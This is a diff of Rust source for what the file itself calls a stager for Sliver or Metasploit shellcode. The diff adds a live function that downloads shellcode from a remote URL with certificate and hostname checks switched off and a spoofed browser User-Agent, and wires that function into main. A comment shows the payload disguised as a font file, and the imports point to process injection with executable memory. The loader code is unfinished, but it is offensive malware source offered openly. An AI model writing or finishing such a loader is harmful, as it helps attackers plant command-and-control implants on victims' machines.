@@ -1,9 +1,11 @@
 // Implement a stager for Shellcode Injection of Sliver or Metasploit Shellcode
+use std::process::exit;
+use bytes::Bytes;
 
 extern crate kernel32;
 use clap::Parser;
-use reqwest;
 use std::ptr;
+
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
@@ -29,28 +31,35 @@ struct Args {
     aes_iv: String,
 }
 
-fn download_and_execute() {}
+fn download_and_execute(url: String) {
+    // Download Shellcode from stage-listener
+    let stage_one = download_shellcode_from_url(url);
+    println!("Downloaded Shellcode: {} bytes", stage_one.len());
+
+}
+
 fn decompress() {}
 fn decrypt() {}
 
-// fn download_shellcode_from_url(url: &str) -> Result<Vec<u8>, &'static str> {
-//     let client = reqwest::blocking::Client::new();
-//     let req = client.get(url)
-//     .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3");
+fn download_shellcode_from_url(url: String) -> Bytes {
+    let client = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .danger_accept_invalid_hostnames(true)
+        .build()
+        .unwrap();
 
-//     let res = req.send();
-//     match res {
-//         Ok(response) => {
-//             if response.status().is_success() {
-//                 let shellcode = response.bytes().unwrap().to_vec();
-//                 Ok(shellcode)
-//             } else {
-//                 Err("Failed to download shellcode from the URL.")
-//             }
-//         }
-//         Err(_) => Err("Failed to download shellcode from the URL."),
-//     }
-// }
+    let res = match client.get(url).send() {
+        Ok(res) => res,
+        Err(_) => panic!("")
+    };
+ 
+    let rbytes = match res.bytes() {
+        Ok(b) => b,
+        Err(_) => panic!("")
+    };
+    
+    return rbytes;
+}
 
 // fn find_process_by_name(process_name: &str) -> u32 {
 //     let sys = System::new_all();
@@ -67,6 +76,7 @@ fn main() {
     let args = Args::parse();
 
     println!("Hello {}!", args.url);
+    download_and_execute(args.url);
 
     //Download shellcode stage and execute process injection
     // let shellcode_url: &str = "http://x.x.x.x/fontawesome.woff";
